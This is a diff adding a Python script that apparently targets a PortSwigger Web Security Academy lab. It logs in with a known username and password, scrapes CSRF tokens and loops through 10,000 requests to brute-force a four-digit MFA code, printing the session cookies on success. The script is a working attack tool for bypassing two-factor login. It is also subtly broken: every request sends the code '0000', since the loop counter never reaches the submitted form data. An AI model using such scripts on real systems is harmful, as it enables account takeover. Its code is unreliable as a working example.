@@ -1,0 +1,153 @@
+#!/usr/bin/python3
+
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
+import requests
+import sys
+from bs4 import BeautifulSoup
+
+url1 = "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net/login"
+
+headers1 = {
+    "Host": "0ae700a204aa86d0849b0edc00320058.web-security-academy.net",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Referer": "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net/",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-User": "?1",
+    "Priority": "u=0, i",
+    "Te": "trailers"
+}
+
+
+
+url2 = "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net/login"
+
+headers2 = {
+    "Host": "0ae700a204aa86d0849b0edc00320058.web-security-academy.net",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Content-Length": "70",
+    "Origin": "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net",
+    "Referer": "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net/login2",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-User": "?1",
+    "Priority": "u=0, i",
+    "Te": "trailers"
+}
+
+cookies2 = {
+    "session": "Us30Cqa6nyfknAvRbCOgsueNiQZgBfsE"
+}
+
+data2 = {
+    "csrf": [
+        "xnfC29lO8cy6XFqIzak7P9J3QtEeVnrj"
+    ],
+    "username": [
+        "carlos"
+    ],
+    "password": [
+        "montoya"
+    ]
+}
+
+
+
+url3 = "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net/login2"
+
+headers3 = {
+    "Host": "0ae700a204aa86d0849b0edc00320058.web-security-academy.net",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Referer": "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net/login",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-User": "?1",
+    "Priority": "u=0, i",
+    "Te": "trailers"
+}
+
+cookies3 = {
+    "session": "9BbTqNpgmF4SOt1zxDS11ogNC6fyFzwB"
+}
+
+
+url4 = "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net/login2"
+
+headers4 = {
+    "Host": "0ae700a204aa86d0849b0edc00320058.web-security-academy.net",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Content-Length": "51",
+    "Origin": "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net",
+    "Referer": "https://0ae700a204aa86d0849b0edc00320058.web-security-academy.net/login2",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-User": "?1",
+    "Priority": "u=0, i",
+    "Te": "trailers"
+}
+
+cookies4 = {
+    "session": "dEkfPhEdZa50YBdL5I7w734IypyBPCqQ"
+}
+
+data4 = {
+    "csrf": [
+        "xnfC29lO8cy6XFqIzak7P9J3QtEeVnrj"
+    ],
+    "mfa-code": [
+        "0000"
+    ]
+}
+
+def send_request(identify, delay):
+        if delay > 0:
+                time.sleep(delay)
+        with requests.Session() as session:
+                response1 = session.get(url1, headers=headers1)
+                soup = BeautifulSoup(response1.text, "html.parser")
+                csrf_token = soup.find("input", {"name": "csrf"})["value"]
+                data2["csrf"] = csrf_token
+                response2 = session.post(url2, headers=headers2, data=data2)
+                response3 = session.get(url3, headers=headers3)
+                soup = BeautifulSoup(response3.text, "html.parser")
+                csrf_token = soup.find("input", {"name": "csrf"})["value"]
+                data4["csrf"] = csrf_token
+                response4 = session.post(url4, headers=headers4, data=data4, allow_redirects=False)
+        return response4
+
+
+if __name__ == "__main__":
+        for i in range(10000):
+                response = send_request(f"{i:04d}", delay=0.2)
+                print(f"\r[+] testing code : {i:04d} ...", end="", flush=True)
+                if response.status_code == 302:
+                        print(f"\n{response.cookies.get_dict()} - code : {i}")
+                        break
+
+      
+
+    #print(response.status_code)
+    #print(response.text)
